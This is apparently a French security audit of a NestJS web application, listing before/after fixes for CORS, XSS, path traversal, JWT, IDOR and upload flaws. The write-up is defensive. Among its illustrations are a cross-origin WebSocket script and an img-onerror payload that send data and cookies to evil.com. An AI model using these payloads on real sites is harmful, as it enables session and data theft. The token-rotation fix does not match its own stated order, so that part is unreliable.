Corrections Critiques

C2
WebSocket CORS — origin: true
events.gateway.ts Corrige

Concept — CORS (Cross-Origin Resource Sharing) : Le CORS est un mecanisme de securite du navigateur qui bloque les requetes emises depuis un domaine different. Quand origin: true est configure, Socket.io accepte TOUTES les origines comme valides. Combine a credentials: true (envoi des cookies httpOnly), n'importe quel site peut ouvrir une connexion WebSocket authentifiee au nom d'un utilisateur.

Attaque concrete : Un site malveillant heberge ce script :

// L'utilisateur connecte a Spektr visite evil.com
const socket = io('https://api.spektr.com', { withCredentials: true });
socket.on('notification', (data) => {
  fetch('https://evil.com/steal?d=' + JSON.stringify(data));
});
// Le cookie refreshToken est envoye automatiquement
// -> connexion etablie -> notifications exfiltrees

Avant

@WebSocketGateway({
  cors: {
    origin: true, // accepte TOUT
    credentials: true,
  },
})

Apres

@WebSocketGateway({
  cors: {
    origin: (requestOrigin, callback) => {
      // Appele a la connexion, pas au chargement
      callback(null,
        requestOrigin === process.env.FRONT_URL
      );
    },
    credentials: true,
  },
})

On utilise une fonction callback plutot qu'une valeur statique car le decorateur @WebSocketGateway est evalue au chargement du module JS, avant que ConfigModule injecte le .env. La fonction est appelee a l'heure de la connexion — quand process.env.FRONT_URL est disponible.

C3 / C8
Injection HTML dans les emails
notifications.service.ts Corrige

Concept — XSS stocke via email (CWE-80) : Le XSS (Cross-Site Scripting) est une attaque ou du code HTML/JavaScript malveillant est injecte dans du contenu affiche par un navigateur. Ici le vecteur est un email HTML. Si un admin envoie un commentaire contenant <img src=x onerror="fetch('evil.com?c='+document.cookie)">, ce code s'execute quand l'etudiant ouvre l'email dans un client qui execute le JavaScript (Outlook Web, Gmail...).

Champs vulnerables avant correction :

// Feedback — commentaire libre de l'admin
${comment.replace(/\n/g, '<br>')}  // .replace() n'echappe PAS le HTML !

// Email objectif — titre et description de l'admin
${title}
${description}

// Email changement mdp — donnees de la DB (modifiables a l'inscription)
Bonjour ${firstName}
Compte : ${user.email}

Correction — fonction escapeHtml() ajoutee :

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')  // & -> &amp; (toujours en premier)
    .replace(/</g,  '&lt;')   // < -> &lt;  (bloque les balises HTML)
    .replace(/>/g,  '&gt;')   // > -> &gt;
    .replace(/"/g,  '&quot;') // " -> &quot;
    .replace(/'/g,  '&#039;');// ' -> &#039;
}

// Utilisation dans les templates :
Bonjour ${escapeHtml(firstName)}
${escapeHtml(comment).replace(/\n/g, '<br>')}

Le navigateur affiche les entites HTML comme du texte brut — jamais comme du code executable.

C4
Path Traversal via file.originalname
documents.service.ts Corrige

Concept — Path Traversal (CWE-22) : Un path traversal se produit quand un nom de fichier fourni par l'utilisateur contient des sequences ../ qui naviguent en dehors du repertoire prevu. Si MinIO est mal configure, un fichier nomme ../../../admin/config.json pourrait ecraser des fichiers systeme ou les fichiers d'un autre utilisateur.

Avant

// file.originalname vient du client HTTP
// Peut etre "../../../etc/passwd"
const storageKey =
  `${userId}/${Date.now()}-${file.originalname}`;

Apres

// UUID genere cote serveur = zero controle attaquant
const ext = extname(file.originalname)
  .replace(/[^a-zA-Z0-9.]/g, '') // supprime .. et /
  .toLowerCase();
const safeFilename = `${randomUUID()}${ext}`;
const storageKey =
  `${userId}/${Date.now()}-${safeFilename}`;

// Nom original conserve en DB pour l'affichage uniquement
name: file.originalname.replace(/[<>"'\/\\]/g, '_')
C5
CORS ouvert si FRONT_URL est undefined
main.ts Corrige

Concept — Fail-open vs Fail-secure : Un systeme "fail-open" autorise tout si une configuration est manquante. Express/NestJS, quand origin: undefined, se comporte de facon permissive et peut accepter toutes les origines. La bonne pratique de securite est "fail-secure" : l'application refuse de demarrer si une config critique est absente.

Avant

app.enableCors({
  origin: process.env.FRONT_URL,
  // Si undefined => comportement permissif
  credentials: true,
});

Apres

const frontUrl = process.env.FRONT_URL;
if (!frontUrl)
  throw new Error('FRONT_URL is not set');
// L'app plante au demarrage si non configure
app.enableCors({ origin: frontUrl, credentials: true });
C6
JWT_SECRET sans longueur minimale
env.validation.ts Corrige

Concept — Entropie des cles JWT : Un JWT signe avec HMAC-SHA256 est securise si le secret a suffisamment d'entropie. Avec un secret de 8 caracteres, un attaquant qui possede des tokens signes peut tenter des millions de combinaisons hors-ligne pour retrouver le secret, puis forger des tokens avec n'importe quel sub (ID utilisateur) ou role: "ADMIN". NIST SP 800-131A recommande minimum 256 bits (32 octets) pour HMAC-SHA256.

Avant

JWT_SECRET: Joi.string().required()
// secret="a" => valide !

Apres

JWT_SECRET: Joi.string().min(32).required()
// L'app refuse de demarrer si secret trop court
C7
Expiration du refresh token verifiee apres suppression
auth.service.ts Corrige

Concept — TOCTOU (Time-of-Check-Time-of-Use) & Token Rotation : La rotation de refresh tokens invalide l'ancien token a chaque usage pour empecher sa reutilisation (si vole). L'ordre est critique : supprimer AVANT de verifier l'expiration signifie qu'un token expire est quand meme supprime sans erreur logique exploitable. La version correcte est : lire → verifier l'expiration → supprimer → emettre un nouveau token.

Avant — suppression AVANT verification

// Token supprime meme s'il est expire
record = await prisma.refreshToken.delete(...)
// La verification arrive trop tard
if (record.expires_at < new Date())
  throw new UnauthorizedException();

Apres — lecture, verification, PUIS suppression

// 1. Lire sans supprimer
const record = await prisma.refreshToken
  .findUnique({ where: { token: hashed } });
if (!record) throw new UnauthorizedException();

// 2. Supprimer (one-time use, invalide immediatement)
await prisma.refreshToken.delete(...);

// 3. Verifier l'expiration
if (record.expires_at < new Date())
  throw new UnauthorizedException();

Corrections Elevees

E1
IDOR — GET /users/:id
users.controller.ts Corrige

Concept — IDOR (Insecure Direct Object Reference, OWASP A01) : Une faille IDOR se produit quand un endpoint utilise un identifiant fourni par le client pour acceder a une ressource sans verifier que le client possede cette ressource. L'attaquant incremente l'ID dans l'URL (/users/1, /users/2...) pour recuperer les profils de tous les utilisateurs : prenom, nom, email, role, promo.

Avant

@Get(':id')
findOne(@Param('id') id: string) {
  // Aucune verification de propriete !
  return this.usersService.findOne({
    id: Number(id) // Number() trop permissif
  });
}

Apres

@Get(':id')
findOne(
  @Param('id', ParseIntPipe) id: number,
  @CurrentUser() currentUser: UserModel,
) {
  if (currentUser.role !== Role.ADMIN
      && currentUser.id !== id) {
    throw new ForbiddenException(); // 403
  }
  return this.usersService.findOne({ id });
}

Bonus — ParseIntPipe : Number("123abc") retourne silencieusement 123. ParseIntPipe retourne une erreur 400 Bad Request pour toute entree non entiere stricte. Remplace tous les Number(id) et +id dans le controller.

E2
Upload sans validation de taille ni de type
documents.controller.ts Corrige

Concept — Unrestricted File Upload (CWE-434) : Sans limite de taille, un utilisateur peut uploader un fichier de plusieurs Go pour saturer le stockage (attaque DoS). Sans validation de type MIME, il peut uploader un executable .exe en l'appelant photo.jpg avec Content-Type: image/jpeg — le serveur l'accepte. La validation cote serveur est obligatoire ; le Content-Type envoye par le client ne peut jamais etre fiable.

@UseInterceptors(
  FileInterceptor('file', {
    limits: { fileSize: 10 * 1024 * 1024 }, // 10 MB max
    fileFilter: (_req, file, cb) => {
      const ALLOWED = new Set([
        'application/pdf',
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/vnd.ms-excel',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'text/plain',
      ]);
      if (ALLOWED.has(file.mimetype)) {
        cb(null, true);   // accepter
      } else {
        cb(new BadRequestException('Type non autorise'), false);
      }
    },
  }),
)
E3
Helmet — Headers de securite HTTP
main.ts Corrige

Concept — Security Headers : Les navigateurs respectent certains headers HTTP envoyes par le serveur pour activer des protections. Sans eux, plusieurs attaques sont possibles. Helmet est un middleware qui ajoute automatiquement tous ces headers en une ligne.

Header ajoute par HelmetProtection
X-Frame-Options: DENYClickjacking — empêche d'integrer le site dans une iframe
X-Content-Type-Options: nosniffMIME sniffing — le navigateur n'execute pas un .js renomme en .jpg
Strict-Transport-SecurityHSTS — le navigateur force HTTPS, jamais HTTP
Referrer-PolicyControle les infos envoyees dans le header Referer
Supprime X-Powered-By: ExpressCache la stack technique aux attaquants
 
import helmet from 'helmet';
app.use(helmet()); // Une seule ligne
E4 / E5
Algorithme JWT non explicite + verify sans secret
auth.module.ts · events.gateway.ts Corrige

Concept — Algorithm Confusion Attack : Un JWT contient un header { "alg": "HS256" }. Si le serveur ne specifie pas explicitement l'algorithme attendu, une librairie mal configuree pourrait accepter "alg": "none" (token sans signature). Avec RS256 (asymetrique), un attaquant peut aussi soumettre un token signe avec la cle publique en pretendant utiliser HS256 — certaines implementations acceptent cela sans erreur.

Avant

// auth.module.ts
signOptions: { expiresIn: '15m' }
// algorithme implicite (defaut)

// events.gateway.ts
const payload = this.jwtService.verify(token);
// pas de secret ni d'algorithme

Apres

// auth.module.ts
signOptions: { expiresIn: '15m', algorithm: 'HS256' }

// events.gateway.ts
const payload = this.jwtService.verify(token, {
  secret: this.config.get('JWT_SECRET'),
  algorithms: ['HS256'], // liste blanche stricte
});
E6
SHA-256 sans sel remplace par HMAC-SHA256
auth.service.ts Corrige

Concept — Rainbow Tables & HMAC : Un hash SHA-256 pur est deterministe : sha256("abc") donne toujours la meme valeur. Si la DB est compromise, un attaquant peut precalculer des millions de hashes de tokens possibles (rainbow table) et les comparer instantanement. HMAC-SHA256 incorpore une cle secrete dans le calcul : sans le JWT_SECRET, la rainbow table est inutilisable meme avec acces complet a la DB.

Avant — SHA-256 pur, pas de sel

import { createHash } from 'crypto';

private hashTokenForStorage(token: string) {
  return createHash('sha256')
    .update(token)
    .digest('hex');
  // Vulnerable aux rainbow tables
}

Apres — HMAC-SHA256 avec JWT_SECRET

import { createHmac } from 'crypto';

private hashTokenForStorage(token: string) {
  return createHmac('sha256',
      this.config.get('JWT_SECRET')!)
    .update(token)
    .digest('hex');
  // Sans le secret, le hash est irreversible
}
E7
ChangePasswordDto + politique de mot de passe
users/dto/change-password.dto.ts (nouveau fichier) Corrige

Concept — DTO & Validation : Un DTO (Data Transfer Object) est une classe TypeScript qui decrit exactement la forme attendue d'une requete. Coupleacee a class-validator et ValidationPipe, NestJS valide automatiquement chaque champ avant d'entrer dans le controller. Sans DTO, le endpoint acceptait n'importe quel body sans aucune contrainte sur le nouveau mot de passe.

// Nouveau fichier : users/dto/change-password.dto.ts
export class ChangePasswordDto {
  @IsString()
  oldPassword!: string;

  @IsString()
  @MinLength(12)   // minimum 12 caracteres (vs 8 avant)
  @Matches(/^(?=.*[A-Z])(?=.*[0-9])(?=.*[^A-Za-z0-9])/, {
    message: 'Doit contenir 1 majuscule, 1 chiffre, 1 caractere special',
  })
  newPassword!: string;
}

// Le @Matches() utilise des lookaheads regex :
// (?=.*[A-Z])       => au moins 1 majuscule quelque part
// (?=.*[0-9])       => au moins 1 chiffre quelque part
// (?=.*[^A-Za-z0-9]) => au moins 1 caractere non-alphanumerique
E8
forbidNonWhitelisted: true dans ValidationPipe
main.ts Corrige

Concept — Mass Assignment (CWE-915) : Sans forbidNonWhitelisted, si un attaquant envoie { "firstName": "hack", "role": "ADMIN" }, NestJS supprime silencieusement le champ "role" mais n'envoie aucune erreur. L'attaquant ne sait pas si son injection a fonctionne. Avec forbidNonWhitelisted: true, la requete retourne une erreur 400 immediatement — les tentatives sont visibles et dissuadees.

Avant

new ValidationPipe({
  whitelist: true,
  // champs extra => supprimes silencieusement
})

Apres

new ValidationPipe({
  whitelist: true,
  forbidNonWhitelisted: true, // champs extra => 400
  transform: true,  // convertit les types automatiquement
})
